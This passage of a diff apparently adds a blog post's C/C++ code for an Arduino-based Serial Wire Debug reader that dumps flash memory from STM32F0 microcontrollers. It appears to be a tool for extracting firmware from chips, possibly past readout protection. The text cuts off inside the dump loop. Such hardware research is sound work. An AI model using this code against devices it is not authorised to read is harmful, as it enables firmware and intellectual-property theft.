+            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">MWAIT</span><span class="p">;</span>
+
+        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+        <span class="n">MWAIT</span><span class="p">;</span>
+        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
+        <span class="n">MWAIT</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">INPUT</span><span class="p">);</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+
+    <span class="n">MWAIT</span><span class="p">;</span>
+    <span class="n">swdDataIdle</span><span class="p">();</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
+        <span class="n">cdata</span> <span class="o">|=</span> <span class="n">digitalRead</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">)</span> <span class="o">?</span> <span class="mh">0x80u</span> <span class="o">:</span> <span class="mh">0x00u</span><span class="p">;</span>
+        <span class="n">data</span><span class="p">[(((</span><span class="n">len</span> <span class="o">+</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1u</span><span class="p">]</span> <span class="o">=</span> <span class="n">cdata</span><span class="p">;</span>
+
+        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+        <span class="n">MWAIT</span><span class="p">;</span>
+        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+        <span class="n">MWAIT</span><span class="p">;</span>
+
+        <span class="cm">/* clear buffer after reading 8 bytes */</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="n">MWAIT</span><span class="p">;</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+
+    <span class="cm">/* 50 clk+x */</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">50u</span> <span class="o">+</span> <span class="mi">10u</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+        <span class="n">MWAIT</span><span class="p">;</span>
+        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+        <span class="n">MWAIT</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+        <span class="n">MWAIT</span><span class="p">;</span>
+        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+        <span class="n">MWAIT</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">portSel</span> <span class="o">==</span> <span class="n">swdPortSelectAP</span><span class="p">)</span> <span class="p">{</span>
+        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span> <span class="cm">/* Access AP */</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">adir</span> <span class="o">==</span> <span class="n">swdAccessDirectionRead</span><span class="p">)</span> <span class="p">{</span>
+        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x04u</span><span class="p">;</span> <span class="cm">/* read access */</span>
+    <span class="p">}</span>
+
+    <span class="k">switch</span> <span class="p">(</span><span class="n">A32</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="mh">0x01u</span><span class="p">:</span>
+            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x08u</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+
+        <span class="k">case</span> <span class="mh">0x02u</span><span class="p">:</span>
+            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x10u</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+
+        <span class="k">case</span> <span class="mh">0x03u</span><span class="p">:</span>
+            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x18u</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+
+        <span class="nl">default:</span>
+        <span class="k">case</span> <span class="mh">0x00u</span><span class="p">:</span>
+
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">header</span><span class="p">,</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5u</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x01u</span><span class="p">;</span> <span class="cm">/* startbit */</span>
+    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x80u</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
+    <span class="kt">uint8_t</span> <span class="n">resp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
+    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionRead</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>
+
+    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
+    <span class="n">swdDataIdle</span><span class="p">();</span>
+    <span class="n">swdTurnaround</span><span class="p">();</span>
+    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>
+
+    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>
+
+    <span class="n">swdDataPP</span><span class="p">();</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_READ_TURN</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">swdTurnaround</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
+    <span class="kt">uint8_t</span> <span class="n">data1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
+    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionWrite</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>
+
+    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+
+    <span class="n">swdDataIdle</span><span class="p">();</span>
+    <span class="n">MWAIT</span><span class="p">;</span>
+
+    <span class="n">swdTurnaround</span><span class="p">();</span>
+
+    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>
+
+    <span class="n">swdDataIdle</span><span class="p">();</span>
+
+    <span class="n">swdTurnaround</span><span class="p">();</span>
+    <span class="n">swdDataPP</span><span class="p">();</span>
+
+    <span class="n">data1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
+    <span class="n">data1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
+    <span class="n">data1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
+    <span class="n">data1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">24u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
+    <span class="n">data1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">8u</span> <span class="o">*</span> <span class="mi">4u</span><span class="p">);</span>
+
+    <span class="n">swdDatasend</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>
+
+    <span class="n">swdDataPP</span><span class="p">();</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">swdTurnaround</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">swdStatus_t</span> <span class="nf">swdReadIdcode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idCode</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">ret</span><span class="p">;</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">idCode</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">swdStatus_t</span> <span class="nf">swdSelectAPnBank</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">ap</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">bank</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">data</span> <span class="o">=</span> <span class="mh">0x00000000u</span><span class="p">;</span>
+
+    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">ap</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">;</span>
+    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">bank</span> <span class="o">&amp;</span> <span class="mh">0x0Fu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">0u</span><span class="p">;</span>
+
+    <span class="cm">/* write to select register */</span>
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x02u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
+
+    <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">swdStatus_t</span> <span class="nf">swdSetAP32BitMode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
+
+    <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>
+
+    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
+
+    <span class="n">d</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x07u</span><span class="p">);</span>
+    <span class="n">d</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span>
+
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">d</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">swdStatus_t</span> <span class="nf">swdSelectAHBAP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">swdStatus_t</span> <span class="nf">swdReadAHBAddr</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
+
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
+
+    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">swdStatus_t</span> <span class="nf">swdEnableDebugIF</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
+
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="mh">0x50000000u</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">swdStatus_t</span> <span class="nf">swdInit</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idcode</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
+
+    <span class="n">swdReset</span><span class="p">();</span>
+    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadIdcode</span><span class="p">(</span><span class="n">idcode</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="maincpp">main.cpp</h3>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ * Copyright (C) 2017 Obermaier Johannes
+ * Copyright (C) 2022 Lucas Teske
+ *
+ * This Source Code Form is subject to the terms of the MIT License.
+ * If a copy of the MIT License was not distributed with this file,
+ * you can obtain one at https://opensource.org/licenses/MIT
+ */</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;Arduino.h&gt;</span><span class="cp">
+</span>
+<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>
+    <span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
+</span>    <span class="cp">#include</span> <span class="cpf">"reader.h"</span><span class="cp">
+</span><span class="p">}</span>
+
+<span class="c1">// STM32 target flash memory size in bytes</span>
+<span class="kt">uint32_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">32768</span><span class="p">;</span>
+
+<span class="c1">// Usually the STM32F0x starts here.</span>
+<span class="c1">// If you're trying to dump another series check the datasheet.</span>
+<span class="kt">uint32_t</span> <span class="n">flashAddress</span> <span class="o">=</span> <span class="mh">0x08000000</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">swdStatus_t</span> <span class="n">status</span><span class="p">;</span>
+    <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>
+
+    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
+    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
+    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
+    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
+
+    <span class="n">targetInit</span><span class="p">();</span>
+    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">Serial</span><span class="p">.</span><span class="n">available</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Send anything to start..."</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Starting"</span><span class="p">);</span>
+
+    <span class="kt">uint32_t</span> <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
